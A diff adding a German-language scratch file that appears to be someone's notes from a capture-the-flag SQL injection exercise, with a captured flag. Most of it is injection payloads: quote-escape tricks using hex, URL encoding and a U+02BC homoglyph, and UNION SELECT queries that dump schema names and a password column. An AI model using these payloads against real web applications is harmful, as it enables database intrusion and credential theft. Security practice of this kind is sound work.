@@ -1,0 +1,73 @@
+SELECT id, title, content FROM articles WHERE public=1 AND (id='  \'   \' OR title=' ) union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1 ---')
+- also ich muss in das erste feld ein ' rein tuen (')
+- evtl. muss ich \ (quotation mark) \ einfügen damit das ganze als ein string erkannt wird
+- und ich das zweite feld muss ich keins rein tun weil da steht ja schon eins dann 
+- da muss ich nur das zweite kaputt machen, indem ich da ein -- am ende hin tue 
+- und da kommt dann also nur noch eine klammer zu und mein code rein 
+dann steht da 
+
+Wie kriege ich ich ein quotation mark da rein ohne das python sagt fuck you ? 
+- 0x27
+- 0027
+- %27
+
+
+flag{wow_you_are_getting_better}
+
+
+das hier funktoniert: 
+\ 0x27 \    -- hex encode 
+\ 0027 \   --ansi? encode 
+\ %27 \   --url encode 
+\ -- einfach nur ein \ weil das hätte auch schon geklappt 
+
+
+union select: 
+
+das hier funktoniert als query: 
+) union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1  --  (error: use multi=true when bla bla) 
+) union select id, name, password from userdatathatisvaluable limit 0,1  --
+
+
+SELECT id, title, content FROM articles WHERE public=1 AND (id='0') union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1 
+
+SELECT id, title, content FROM articles WHERE public=1 AND (id=a0x27) 
+
+
+
+
+0x27 OR 1 )# funktioniert nicht
+
+
+actual code in ascii: U+0027
+modified homoglyph code: 
+U+02BC
+
+%CA%BC)
+
+0 U+02BC ) #
+
+
+ʼ  
+
+0ʼ OR 0) union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1 #
+
+0ʼ OR 0) union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1 #
+
+
+1 0x27) union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1 --
+
+
+SELECT CONCAT(CHAR(39)), CONCAT(CHAR(39)) ) --
+
+
+
+concat(0, char(39),char(41)) union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1 #
+
+
+ich glaub das funktoniert nicht, weil bei ' ein string beginnt und die engine dann keine sql funktionen ausführt 
+
+
+hello (etwas das python nicht als ' erkennt aber sql schon)
+ʼ
+helo 
